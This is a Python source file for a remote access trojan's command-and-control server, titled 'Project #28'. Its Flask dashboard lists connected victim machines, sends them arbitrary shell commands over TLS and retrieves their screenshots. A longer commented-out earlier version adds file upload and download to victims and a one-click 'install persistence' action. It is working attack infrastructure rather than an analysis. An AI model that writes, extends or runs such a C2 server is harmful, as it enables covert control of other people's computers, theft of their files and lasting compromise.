#!/usr/bin/env python3
"""
PROJECT #28 — RAT C2 Server - FINAL WORKING VERSION
"""

import os
import sys
import json
import ssl
import socket
import threading
import time
import base64
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Global state
clients = {}
client_counter = 0
command_outputs = {}

# HTML Dashboard - SIMPLIFIED
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>RAT C2</title>
    <style>
        body{background:#0a0a1a;color:#00ff88;font-family:monospace;padding:20px;}
        .header{background:#1a1a3e;padding:20px;border-radius:10px;}
        h1{color:#00d4ff;}
        .panel{background:#1a1a3e;padding:20px;border-radius:10px;margin:10px 0;}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
        .client{background:#2a2a5e;padding:10px;margin:5px 0;border-radius:5px;cursor:pointer;}
        .client:hover{background:#3a3a7e;}
        input{background:#2a2a5e;padding:10px;border:1px solid #3a3a7e;border-radius:5px;color:#00ff88;width:70%;}
        button{background:#00d4ff;color:#000;padding:10px 20px;border:none;border-radius:5px;cursor:pointer;font-weight:bold;}
        .output{background:#0a0a1a;padding:10px;border-radius:5px;min-height:150px;white-space:pre-wrap;border:1px solid #1a1a3e;}
        .status{color:#00ff88;}
        .offline{color:#ff4444;}
    </style>
</head>
<body>
<div class="header"><h1>🎯 RAT C2 Dashboard</h1></div>
<div class="grid">
<div class="panel">
    <h3>Clients: <span id="count">0</span></h3>
    <div id="clients"></div>
</div>
<div class="panel">
    <h3>Control</h3>
    <div id="info">Select a client</div>
    <input type="text" id="cmd" placeholder="Command..." onkeydown="if(event.key==='Enter')send()">
    <button onclick="send()">Execute</button>
    <br><br>
    <button onclick="screenshot()">📸 Screenshot</button>
    <div class="output" id="output">Ready</div>
</div>
</div>
<script>
var selected = null;

function refresh() {
    fetch('/api/clients')
    .then(r => r.json())
    .then(data => {
        document.getElementById('count').textContent = data.length;
        var html = '';
        data.forEach(function(c) {
            var status = c.connected ? '🟢' : '🔴';
            html += '<div class="client" onclick="select(\''+c.id+'\')">'+c.id+' - '+c.ip+' '+status+'</div>';
        });
        document.getElementById('clients').innerHTML = html || 'No clients';
    });
}

function select(id) {
    selected = id;
    document.getElementById('info').innerHTML = 'Selected: '+id+' 🟢';
    document.getElementById('output').textContent = 'Ready on '+id;
}

function send() {
    if(!selected) { alert('Select a client'); return; }
    var cmd = document.getElementById('cmd').value;
    if(!cmd) return;
    document.getElementById('output').textContent = 'Executing...';
    
    fetch('/api/execute', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({client_id:selected, command:cmd})
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('output').textContent = data.output || data.error || 'Done';
        document.getElementById('cmd').value = '';
        refresh();
    });
}

function screenshot() {
    if(!selected) { alert('Select a client'); return; }
    document.getElementById('output').textContent = 'Taking screenshot...';
    fetch('/api/screenshot', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({client_id:selected})
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('output').textContent = data.filename ? '📸 Saved: '+data.filename : 'Error: '+data.error;
    });
}

setInterval(refresh, 2000);
refresh();
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/clients')
def get_clients():
    result = []
    for cid, info in clients.items():
        if info.get('connected', False):
            result.append({
                'id': cid,
                'ip': info.get('ip', 'Unknown'),
                'connected': info.get('connected', False)
            })
    return jsonify(result)

@app.route('/api/execute', methods=['POST'])
def execute():
    data = request.json
    cid = data.get('client_id')
    cmd = data.get('command')
    
    if cid not in clients or not clients[cid].get('connected'):
        return jsonify({'error': 'Client not connected'})
    
    try:
        sock = clients[cid].get('socket')
        if sock:
            # Send command
            sock.sendall(f"{cmd}\n".encode())
            sock.settimeout(10)
            
            # Receive response
            response = b''
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b'__EOF__' in chunk:
                    break
            
            # Clean up
            output = response.replace(b'__EOF__', b'').decode('utf-8', errors='ignore').strip()
            return jsonify({'output': output or '[+] Command executed (no output)'})
            
    except socket.timeout:
        return jsonify({'error': 'Timeout'})
    except Exception as e:
        return jsonify({'error': str(e)})
    
    return jsonify({'error': 'Unknown error'})

@app.route('/api/screenshot', methods=['POST'])
def screenshot():
    data = request.json
    cid = data.get('client_id')
    
    if cid not in clients or not clients[cid].get('connected'):
        return jsonify({'error': 'Client not connected'})
    
    try:
        sock = clients[cid].get('socket')
        if sock:
            sock.sendall(b"SCREENSHOT\n")
            sock.settimeout(15)
            
            response = b''
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b'__EOF__' in chunk:
                    break
            
            output = response.replace(b'__EOF__', b'').decode('utf-8', errors='ignore')
            
            if output.startswith("SCREENSHOT:"):
                img_data = output[11:]
                filename = f"screenshot_{cid}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(img_data))
                return jsonify({'filename': filename})
            else:
                return jsonify({'error': output})
            
    except socket.timeout:
        return jsonify({'error': 'Screenshot timeout'})
    except Exception as e:
        return jsonify({'error': str(e)})
    
    return jsonify({'error': 'Unknown error'})

class Server:
    def __init__(self, port=4443, web_port=5000):
        self.port = port
        self.web_port = web_port
        self.socket = None
        self.running = True
        
    def generate_cert(self):
        if not os.path.exists('server.crt') or not os.path.exists('server.key'):
            print("[*] Generating SSL certificate...")
            os.system('openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost" 2>/dev/null')
    
    def handle_client(self, sock, addr):
        global client_counter
        client_counter += 1
        cid = f"PC-{client_counter:04d}"
        
        clients[cid] = {
            'socket': sock,
            'ip': f"{addr[0]}:{addr[1]}",
            'connected': True
        }
        
        print(f"[+] Client: {cid} ({addr[0]}:{addr[1]})")
        
        try:
            while self.running:
                # Keep connection alive, read any data
                data = sock.recv(1024)
                if not data:
                    break
        except:
            pass
        finally:
            clients[cid]['connected'] = False
            if 'socket' in clients[cid]:
                del clients[cid]['socket']
            sock.close()
            print(f"[-] Client disconnected: {cid}")
    
    def start(self):
        print("\n" + "="*60)
        print("  PROJECT #28 — RAT C2 Server")
        print("="*60)
        
        self.generate_cert()
        
        # Start Flask
        def run_flask():
            app.run(host='0.0.0.0', port=self.web_port, debug=False, use_reloader=False)
        
        t = threading.Thread(target=run_flask)
        t.daemon = True
        t.start()
        
        print(f"[+] Web: http://localhost:{self.web_port}")
        print(f"[+] C2: 0.0.0.0:{self.port}")
        print("[!] Press Ctrl+C to stop\n")
        
        # SSL
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.load_cert_chain('server.crt', 'server.key')
        
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(('0.0.0.0', self.port))
        self.socket.listen(10)
        self.socket = ctx.wrap_socket(self.socket, server_side=True)
        
        print("[+] Listening...\n")
        
        try:
            while self.running:
                sock, addr = self.socket.accept()
                t = threading.Thread(target=self.handle_client, args=(sock, addr))
                t.daemon = True
                t.start()
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] Shutting down...")
        finally:
            if self.socket:
                self.socket.close()

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--port", type=int, default=4443)
    p.add_argument("--web-port", type=int, default=5000)
    args = p.parse_args()
    s = Server(args.port, args.web_port)
    s.start()

# #!/usr/bin/env python3
# """
# ==============================================================
#   PROJECT #28 — RAT (Remote Administration Tool) - Server
#   Command & Control Framework with Web Dashboard
# ==============================================================
# """

# import os
# import sys
# import json
# import ssl
# import socket
# import threading
# import time
# import base64
# from datetime import datetime
# from flask import Flask, render_template_string, request, jsonify, send_file
# from flask_socketio import SocketIO, emit
# from colorama import init, Fore, Style

# # Initialize colorama
# init(autoreset=True)

# class Colors:
#     HEADER = Fore.CYAN + Style.BRIGHT
#     OKBLUE = Fore.BLUE + Style.BRIGHT
#     OKGREEN = Fore.GREEN + Style.BRIGHT
#     WARNING = Fore.YELLOW + Style.BRIGHT
#     FAIL = Fore.RED + Style.BRIGHT
#     ENDC = Style.RESET_ALL
#     BOLD = Style.BRIGHT
#     DIM = Fore.LIGHTBLACK_EX

# # Flask app
# app = Flask(__name__)
# app.config['SECRET_KEY'] = 'rat_secret_key_change_me'
# socketio = SocketIO(app, cors_allowed_origins="*")

# # Global state
# clients = {}
# client_history = {}
# command_history = []
# client_counter = 0
# server_running = True

# # HTML Dashboard Template
# DASHBOARD_TEMPLATE = """
# <!DOCTYPE html>
# <html>
# <head>
#     <meta charset="UTF-8">
#     <title>RAT C2 Dashboard</title>
#     <style>
#         * { margin: 0; padding: 0; box-sizing: border-box; }
#         body { font-family: 'Segoe UI', sans-serif; background: #0a0a1a; color: #e0e0e0; padding: 20px; }
#         .container { max-width: 1400px; margin: 0 auto; }
#         .header { background: linear-gradient(135deg, #1a1a3e, #0f3460); padding: 20px; border-radius: 10px; margin-bottom: 20px; }
#         .header h1 { color: #00d4ff; }
#         .header small { color: #888; }
#         .stats { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
#         .stat-box { background: #1a1a3e; padding: 20px; border-radius: 8px; flex: 1; min-width: 150px; text-align: center; }
#         .stat-box .number { font-size: 32px; font-weight: bold; color: #00d4ff; }
#         .stat-box .label { color: #888; font-size: 12px; }
#         .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
#         @media (max-width: 768px) { .main-grid { grid-template-columns: 1fr; } }
#         .panel { background: #1a1a3e; border-radius: 10px; padding: 20px; border: 1px solid #2a2a5e; }
#         .panel h3 { color: #00d4ff; margin-bottom: 15px; }
#         .client-list { max-height: 400px; overflow-y: auto; }
#         .client-item { padding: 10px; background: #2a2a5e; margin: 5px 0; border-radius: 5px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
#         .client-item:hover { background: #3a3a7e; }
#         .client-item .id { color: #00d4ff; font-weight: bold; }
#         .client-item .ip { color: #888; font-size: 12px; }
#         .client-item .status { color: #00ff88; font-size: 12px; }
#         .client-item .status.offline { color: #ff4444; }
#         .command-input { display: flex; gap: 10px; margin-top: 10px; }
#         .command-input input { flex: 1; padding: 10px; background: #2a2a5e; border: 1px solid #3a3a7e; border-radius: 5px; color: #e0e0e0; }
#         .command-input button { padding: 10px 20px; background: #00d4ff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
#         .command-input button:hover { background: #00b8d4; }
#         .output { background: #0a0a1a; padding: 10px; border-radius: 5px; font-family: monospace; min-height: 100px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; font-size: 12px; }
#         .log { max-height: 200px; overflow-y: auto; font-size: 12px; }
#         .log .entry { padding: 3px 0; border-bottom: 1px solid #1a1a3e; }
#         .log .time { color: #888; }
#         .log .cmd { color: #00d4ff; }
#         .log .result { color: #00ff88; }
#         .log .error { color: #ff4444; }
#         .actions { display: flex; gap: 5px; flex-wrap: wrap; margin-top: 10px; }
#         .actions button { padding: 5px 10px; background: #2a2a5e; border: 1px solid #3a3a7e; border-radius: 3px; color: #e0e0e0; cursor: pointer; font-size: 12px; }
#         .actions button:hover { background: #3a3a7e; }
#         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; }
#         .modal-content { background: #1a1a3e; padding: 30px; border-radius: 10px; max-width: 500px; width: 90%; }
#         .modal-content input { width: 100%; padding: 10px; margin: 10px 0; background: #2a2a5e; border: 1px solid #3a3a7e; border-radius: 5px; color: #e0e0e0; }
#         .modal-content .close { float: right; cursor: pointer; color: #888; }
#         .modal-content .close:hover { color: #fff; }
#     </style>
#     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.0/socket.io.min.js"></script>
# </head>
# <body>
# <div class="container">
#     <div class="header">
#         <h1>🎯 RAT C2 Dashboard</h1>
#         <small>Connected Clients: <span id="clientCount">0</span> | Total Commands: <span id="cmdCount">0</span></small>
#     </div>
    
#     <div class="stats">
#         <div class="stat-box"><div class="number" id="statClients">0</div><div class="label">Connected Clients</div></div>
#         <div class="stat-box"><div class="number" id="statCommands">0</div><div class="label">Commands Executed</div></div>
#         <div class="stat-box"><div class="number" id="statFiles">0</div><div class="label">Files Transferred</div></div>
#         <div class="stat-box"><div class="number" id="statScreenshots">0</div><div class="label">Screenshots</div></div>
#     </div>
    
#     <div class="main-grid">
#         <div class="panel">
#             <h3>📡 Connected Clients</h3>
#             <div class="client-list" id="clientList">
#                 <div style="color:#888;padding:10px;text-align:center;">Waiting for clients...</div>
#             </div>
#         </div>
#         <div class="panel">
#             <h3>💻 Client Control</h3>
#             <div id="clientInfo" style="color:#888;margin-bottom:10px;">Select a client</div>
#             <div class="command-input">
#                 <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') sendCommand()">
#                 <button onclick="sendCommand()">Execute</button>
#             </div>
#             <div class="actions">
#                 <button onclick="uploadFile()">📤 Upload</button>
#                 <button onclick="downloadFile()">📥 Download</button>
#                 <button onclick="takeScreenshot()">📸 Screenshot</button>
#                 <button onclick="installPersistence()">🔒 Persistence</button>
#                 <button onclick="clearOutput()">🗑️ Clear</button>
#             </div>
#             <h4 style="margin:10px 0 5px 0;color:#888;font-size:12px;">Output:</h4>
#             <div class="output" id="cmdOutput">Ready...</div>
#         </div>
#     </div>
    
#     <div class="panel" style="margin-top:20px;">
#         <h3>📋 Command History</h3>
#         <div class="log" id="commandLog">
#             <div style="color:#888;padding:5px;">No commands yet</div>
#         </div>
#     </div>
# </div>

# <!-- Upload Modal -->
# <div class="modal" id="uploadModal">
#     <div class="modal-content">
#         <span class="close" onclick="closeModal('uploadModal')">&times;</span>
#         <h3>📤 Upload File to Client</h3>
#         <p style="color:#888;font-size:12px;">Select a file to upload to the client</p>
#         <input type="file" id="uploadFileInput">
#         <input type="text" id="uploadPath" placeholder="Destination path (e.g., C:\\Users\\...)">
#         <button onclick="doUpload()" style="padding:10px 20px;background:#00d4ff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;">Upload</button>
#     </div>
# </div>

# <!-- Download Modal -->
# <div class="modal" id="downloadModal">
#     <div class="modal-content">
#         <span class="close" onclick="closeModal('downloadModal')">&times;</span>
#         <h3>📥 Download File from Client</h3>
#         <p style="color:#888;font-size:12px;">Enter the remote file path to download</p>
#         <input type="text" id="downloadPath" placeholder="/home/user/file.txt or C:\\Users\\file.txt">
#         <button onclick="doDownload()" style="padding:10px 20px;background:#00d4ff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;">Download</button>
#     </div>
# </div>

# <script>
#     var socket = io();
#     var selectedClient = null;
#     var clients = {};
    
#     socket.on('connect', function() {
#         console.log('Connected to server');
#     });
    
#     socket.on('client_update', function(data) {
#         clients = data.clients;
#         updateClientList();
#         document.getElementById('clientCount').textContent = Object.keys(clients).length;
#         document.getElementById('statClients').textContent = Object.keys(clients).length;
#     });
    
#     socket.on('command_history', function(data) {
#         updateCommandLog(data.history);
#         document.getElementById('statCommands').textContent = data.history.length;
#         document.getElementById('cmdCount').textContent = data.history.length;
#     });
    
#     socket.on('command_output', function(data) {
#         if (selectedClient === data.client_id) {
#             document.getElementById('cmdOutput').textContent = data.output;
#         }
#     });
    
#     socket.on('screenshot_taken', function(data) {
#         if (selectedClient === data.client_id) {
#             document.getElementById('cmdOutput').textContent = '📸 Screenshot saved: ' + data.filename;
#             document.getElementById('statScreenshots').textContent = parseInt(document.getElementById('statScreenshots').textContent) + 1;
#         }
#     });
    
#     socket.on('file_transfer', function(data) {
#         if (selectedClient === data.client_id) {
#             document.getElementById('cmdOutput').textContent = '📁 ' + data.message;
#             document.getElementById('statFiles').textContent = parseInt(document.getElementById('statFiles').textContent) + 1;
#         }
#     });
    
#     function updateClientList() {
#         var list = document.getElementById('clientList');
#         var keys = Object.keys(clients);
#         if (keys.length === 0) {
#             list.innerHTML = '<div style="color:#888;padding:10px;text-align:center;">Waiting for clients...</div>';
#             return;
#         }
#         var html = '';
#         keys.forEach(function(id) {
#             var client = clients[id];
#             var status = client.connected ? '🟢 Online' : '🔴 Offline';
#             var statusClass = client.connected ? 'status' : 'status offline';
#             html += '<div class="client-item" onclick="selectClient(\'' + id + '\')">' +
#                     '<span><span class="id">' + id + '</span> - ' + client.ip + '</span>' +
#                     '<span><span class="' + statusClass + '">' + status + '</span></span>' +
#                     '</div>';
#         });
#         list.innerHTML = html;
#     }
    
#     function selectClient(id) {
#         selectedClient = id;
#         var client = clients[id];
#         document.getElementById('clientInfo').innerHTML = '<span style="color:#00d4ff;">' + id + '</span> (' + client.ip + ') - ' + 
#             (client.connected ? '🟢 Online' : '🔴 Offline');
#         document.getElementById('cmdOutput').textContent = 'Ready to execute commands on ' + id;
#         document.getElementById('cmdInput').focus();
#     }
    
#     function sendCommand() {
#         if (!selectedClient) {
#             alert('Select a client first');
#             return;
#         }
#         var cmd = document.getElementById('cmdInput').value;
#         if (!cmd) return;
#         document.getElementById('cmdOutput').textContent = '⌛ Executing...';
#         socket.emit('execute_command', {client_id: selectedClient, command: cmd});
#         document.getElementById('cmdInput').value = '';
#     }
    
#     function uploadFile() {
#         if (!selectedClient) { alert('Select a client first'); return; }
#         document.getElementById('uploadModal').style.display = 'flex';
#     }
    
#     function doUpload() {
#         var fileInput = document.getElementById('uploadFileInput');
#         var path = document.getElementById('uploadPath').value;
#         if (!fileInput.files.length) { alert('Select a file'); return; }
#         if (!path) { alert('Enter destination path'); return; }
        
#         var reader = new FileReader();
#         reader.onload = function(e) {
#             var data = btoa(e.target.result);
#             socket.emit('upload_file', {
#                 client_id: selectedClient,
#                 filename: fileInput.files[0].name,
#                 path: path,
#                 data: data
#             });
#             document.getElementById('cmdOutput').textContent = '📤 Uploading ' + fileInput.files[0].name + ' to ' + path;
#         };
#         reader.readAsBinaryString(fileInput.files[0]);
#         closeModal('uploadModal');
#     }
    
#     function downloadFile() {
#         if (!selectedClient) { alert('Select a client first'); return; }
#         document.getElementById('downloadModal').style.display = 'flex';
#     }
    
#     function doDownload() {
#         var path = document.getElementById('downloadPath').value;
#         if (!path) { alert('Enter file path'); return; }
#         socket.emit('download_file', {client_id: selectedClient, path: path});
#         document.getElementById('cmdOutput').textContent = '📥 Downloading ' + path;
#         closeModal('downloadModal');
#     }
    
#     function takeScreenshot() {
#         if (!selectedClient) { alert('Select a client first'); return; }
#         socket.emit('take_screenshot', {client_id: selectedClient});
#         document.getElementById('cmdOutput').textContent = '📸 Taking screenshot...';
#     }
    
#     function installPersistence() {
#         if (!selectedClient) { alert('Select a client first'); return; }
#         socket.emit('install_persistence', {client_id: selectedClient});
#         document.getElementById('cmdOutput').textContent = '🔒 Installing persistence...';
#     }
    
#     function clearOutput() {
#         document.getElementById('cmdOutput').textContent = 'Cleared';
#     }
    
#     function closeModal(id) {
#         document.getElementById(id).style.display = 'none';
#     }
    
#     function updateCommandLog(history) {
#         var log = document.getElementById('commandLog');
#         if (!history || history.length === 0) {
#             log.innerHTML = '<div style="color:#888;padding:5px;">No commands yet</div>';
#             return;
#         }
#         var html = '';
#         history.slice().reverse().forEach(function(entry) {
#             var color = entry.status === 'success' ? 'result' : (entry.status === 'error' ? 'error' : '');
#             html += '<div class="entry"><span class="time">' + entry.time + '</span> ' +
#                     '<span class="cmd">' + entry.client_id + '> ' + entry.command + '</span> ' +
#                     '<span class="' + color + '">' + entry.status + '</span></div>';
#         });
#         log.innerHTML = html;
#     }
    
#     // File input handling
#     document.getElementById('uploadFileInput').addEventListener('change', function(e) {
#         document.getElementById('uploadPath').value = this.files[0] ? 'C:\\Users\\' + this.files[0].name : '';
#     });
# </script>
# </body>
# </html>
# """

# # Flask Routes
# @app.route('/')
# def dashboard():
#     return render_template_string(DASHBOARD_TEMPLATE)

# @app.route('/clients')
# def get_clients():
#     client_list = []
#     for cid, info in clients.items():
#         client_list.append({
#             'id': cid,
#             'ip': info.get('ip', 'Unknown'),
#             'connected': info.get('connected', False),
#             'connected_since': info.get('connected_since', '')
#         })
#     return jsonify(client_list)

# @app.route('/commands')
# def get_commands():
#     return jsonify(command_history[-100:])  # Last 100 commands

# @app.route('/download/<filename>')
# def download_file(filename):
#     return send_file(filename, as_attachment=True)

# # SocketIO Events
# @socketio.on('connect')
# def handle_connect():
#     print(f"{Colors.OKGREEN}[+] Web client connected{Colors.ENDC}")

# @socketio.on('execute_command')
# def handle_execute_command(data):
#     client_id = data.get('client_id')
#     command = data.get('command')
    
#     if client_id not in clients or not clients[client_id].get('connected'):
#         emit('command_output', {
#             'client_id': client_id,
#             'output': 'Client not connected'
#         })
#         return
    
#     # Store command in history
#     command_history.append({
#         'client_id': client_id,
#         'command': command,
#         'time': datetime.now().strftime('%H:%M:%S'),
#         'status': 'pending'
#     })
#     emit('command_history', {'history': command_history}, broadcast=True)
    
#     # Send to client through socket
#     try:
#         client_socket = clients[client_id].get('socket')
#         if client_socket:
#             # Send command
#             client_socket.send(f"CMD:{command}".encode())
            
#             # Wait for response (handled in client handler thread)
#             # The response will come back through the client handler
#     except Exception as e:
#         emit('command_output', {
#             'client_id': client_id,
#             'output': f"Error: {e}"
#         })
#         command_history[-1]['status'] = 'error'

# @socketio.on('upload_file')
# def handle_upload_file(data):
#     client_id = data.get('client_id')
#     filename = data.get('filename')
#     path = data.get('path')
#     file_data = data.get('data')
    
#     if client_id not in clients or not clients[client_id].get('connected'):
#         emit('file_transfer', {'client_id': client_id, 'message': 'Client not connected'})
#         return
    
#     try:
#         client_socket = clients[client_id].get('socket')
#         if client_socket:
#             # Send upload command
#             client_socket.send(f"UPLOAD:{filename}|{path}|{file_data}".encode())
#             command_history.append({
#                 'client_id': client_id,
#                 'command': f"upload {filename} to {path}",
#                 'time': datetime.now().strftime('%H:%M:%S'),
#                 'status': 'pending'
#             })
#             emit('command_history', {'history': command_history}, broadcast=True)
#     except Exception as e:
#         emit('file_transfer', {'client_id': client_id, 'message': f"Error: {e}"})

# @socketio.on('download_file')
# def handle_download_file(data):
#     client_id = data.get('client_id')
#     path = data.get('path')
    
#     if client_id not in clients or not clients[client_id].get('connected'):
#         emit('file_transfer', {'client_id': client_id, 'message': 'Client not connected'})
#         return
    
#     try:
#         client_socket = clients[client_id].get('socket')
#         if client_socket:
#             client_socket.send(f"DOWNLOAD:{path}".encode())
#             command_history.append({
#                 'client_id': client_id,
#                 'command': f"download {path}",
#                 'time': datetime.now().strftime('%H:%M:%S'),
#                 'status': 'pending'
#             })
#             emit('command_history', {'history': command_history}, broadcast=True)
#     except Exception as e:
#         emit('file_transfer', {'client_id': client_id, 'message': f"Error: {e}"})

# @socketio.on('take_screenshot')
# def handle_screenshot(data):
#     client_id = data.get('client_id')
    
#     if client_id not in clients or not clients[client_id].get('connected'):
#         emit('command_output', {'client_id': client_id, 'output': 'Client not connected'})
#         return
    
#     try:
#         client_socket = clients[client_id].get('socket')
#         if client_socket:
#             client_socket.send(b"SCREENSHOT")
#             command_history.append({
#                 'client_id': client_id,
#                 'command': "screenshot",
#                 'time': datetime.now().strftime('%H:%M:%S'),
#                 'status': 'pending'
#             })
#             emit('command_history', {'history': command_history}, broadcast=True)
#     except Exception as e:
#         emit('command_output', {'client_id': client_id, 'output': f"Error: {e}"})

# @socketio.on('install_persistence')
# def handle_persistence(data):
#     client_id = data.get('client_id')
    
#     if client_id not in clients or not clients[client_id].get('connected'):
#         emit('command_output', {'client_id': client_id, 'output': 'Client not connected'})
#         return
    
#     try:
#         client_socket = clients[client_id].get('socket')
#         if client_socket:
#             client_socket.send(b"PERSISTENCE")
#             command_history.append({
#                 'client_id': client_id,
#                 'command': "install persistence",
#                 'time': datetime.now().strftime('%H:%M:%S'),
#                 'status': 'pending'
#             })
#             emit('command_history', {'history': command_history}, broadcast=True)
#     except Exception as e:
#         emit('command_output', {'client_id': client_id, 'output': f"Error: {e}"})

# class RATServer:
#     def __init__(self, host='0.0.0.0', port=4443, web_port=5000):
#         self.host = host
#         self.port = port
#         self.web_port = web_port
#         self.server_socket = None
#         self.running = True
        
#     def generate_cert(self):
#         """Generate self-signed certificate"""
#         if not os.path.exists('server.crt') or not os.path.exists('server.key'):
#             print(f"{Colors.WARNING}[*] Generating SSL certificate...{Colors.ENDC}")
#             os.system('openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost" 2>/dev/null')
    
#     def handle_client(self, client_socket, addr):
#         """Handle connected client"""
#         client_id = f"PC-{len(clients)+1:04d}"
        
#         # Register client
#         clients[client_id] = {
#             'socket': client_socket,
#             'ip': f"{addr[0]}:{addr[1]}",
#             'connected': True,
#             'connected_since': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
#         }
        
#         # Notify dashboard
#         socketio.emit('client_update', {'clients': clients})
        
#         print(f"{Colors.OKGREEN}[+] Client connected: {client_id} ({addr[0]}:{addr[1]}){Colors.ENDC}")
        
#         try:
#             while self.running:
#                 # Receive data from client
#                 data = client_socket.recv(4096)
#                 if not data:
#                     break
                
#                 # Parse command response
#                 response = data.decode('utf-8', errors='ignore')
                
#                 # Handle different response types
#                 if response.startswith("RESULT:"):
#                     result = response[7:]
#                     # Update command history
#                     if command_history:
#                         command_history[-1]['status'] = 'success'
#                         command_history[-1]['result'] = result[:500]
#                     # Send to dashboard
#                     socketio.emit('command_output', {
#                         'client_id': client_id,
#                         'output': result
#                     })
#                     socketio.emit('command_history', {'history': command_history}, broadcast=True)
                
#                 elif response.startswith("SCREENSHOT:"):
#                     # Base64 encoded screenshot
#                     img_data = response[11:]
#                     filename = f"screenshot_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
#                     try:
#                         with open(filename, 'wb') as f:
#                             f.write(base64.b64decode(img_data))
#                         socketio.emit('screenshot_taken', {
#                             'client_id': client_id,
#                             'filename': filename
#                         })
#                         if command_history:
#                             command_history[-1]['status'] = 'success'
#                             command_history[-1]['result'] = f"Screenshot saved: {filename}"
#                         socketio.emit('command_history', {'history': command_history}, broadcast=True)
#                     except Exception as e:
#                         print(f"{Colors.FAIL}[-] Failed to save screenshot: {e}{Colors.ENDC}")
                
#                 elif response.startswith("DOWNLOAD:"):
#                     # File download response
#                     parts = response[9:].split('|', 1)
#                     if len(parts) == 2:
#                         filename, data = parts[0], parts[1]
#                         try:
#                             with open(f"downloaded_{filename}", 'wb') as f:
#                                 f.write(base64.b64decode(data))
#                             socketio.emit('file_transfer', {
#                                 'client_id': client_id,
#                                 'message': f"Downloaded: {filename}"
#                             })
#                             if command_history:
#                                 command_history[-1]['status'] = 'success'
#                                 command_history[-1]['result'] = f"File downloaded: {filename}"
#                             socketio.emit('command_history', {'history': command_history}, broadcast=True)
#                         except Exception as e:
#                             print(f"{Colors.FAIL}[-] Failed to save download: {e}{Colors.ENDC}")
                
#                 elif response.startswith("UPLOAD:"):
#                     # Upload confirmation
#                     socketio.emit('file_transfer', {
#                         'client_id': client_id,
#                         'message': f"Upload successful: {response[7:]}"
#                     })
#                     if command_history:
#                         command_history[-1]['status'] = 'success'
#                         command_history[-1]['result'] = f"Upload successful: {response[7:]}"
#                     socketio.emit('command_history', {'history': command_history}, broadcast=True)
                
#                 elif response.startswith("PERSIST:"):
#                     # Persistence confirmation
#                     socketio.emit('command_output', {
#                         'client_id': client_id,
#                         'output': f"Persistence: {response[7:]}"
#                     })
#                     if command_history:
#                         command_history[-1]['status'] = 'success'
#                         command_history[-1]['result'] = response[7:]
#                     socketio.emit('command_history', {'history': command_history}, broadcast=True)
                
#                 elif response.startswith("ERROR:"):
#                     # Error message
#                     error = response[6:]
#                     if command_history:
#                         command_history[-1]['status'] = 'error'
#                         command_history[-1]['result'] = error
#                     socketio.emit('command_output', {
#                         'client_id': client_id,
#                         'output': f"❌ Error: {error}"
#                     })
#                     socketio.emit('command_history', {'history': command_history}, broadcast=True)
                    
#         except Exception as e:
#             print(f"{Colors.FAIL}[-] Client {client_id} error: {e}{Colors.ENDC}")
        
#         finally:
#             # Cleanup
#             clients[client_id]['connected'] = False
#             if 'socket' in clients[client_id]:
#                 del clients[client_id]['socket']
#             client_socket.close()
#             print(f"{Colors.WARNING}[!] Client disconnected: {client_id}{Colors.ENDC}")
#             socketio.emit('client_update', {'clients': clients})
    
#     def start(self):
#         """Start the RAT server"""
#         print(f"\n{Colors.HEADER}{'='*80}{Colors.ENDC}")
#         print(f"{Colors.HEADER}  PROJECT #28 — RAT C2 Server{Colors.ENDC}")
#         print(f"{Colors.OKBLUE}  Command & Control Framework with Web Dashboard{Colors.ENDC}")
#         print(f"{Colors.HEADER}{'='*80}{Colors.ENDC}\n")
        
#         # Generate certificate
#         self.generate_cert()
        
#         # Start Flask server in a separate thread
#         def run_flask():
#             socketio.run(app, host='0.0.0.0', port=self.web_port, debug=False, use_reloader=False)
        
#         flask_thread = threading.Thread(target=run_flask)
#         flask_thread.daemon = True
#         flask_thread.start()
        
#         print(f"{Colors.OKGREEN}[+] Web dashboard: https://localhost:{self.web_port}{Colors.ENDC}")
#         print(f"{Colors.OKGREEN}[+] C2 server listening on port {self.port}{Colors.ENDC}")
#         print(f"{Colors.WARNING}[!] Press Ctrl+C to stop{Colors.ENDC}\n")
        
#         # Create SSL context
#         context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
#         context.load_cert_chain('server.crt', 'server.key')
        
#         # Create server socket
#         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         self.server_socket.bind((self.host, self.port))
#         self.server_socket.listen(10)
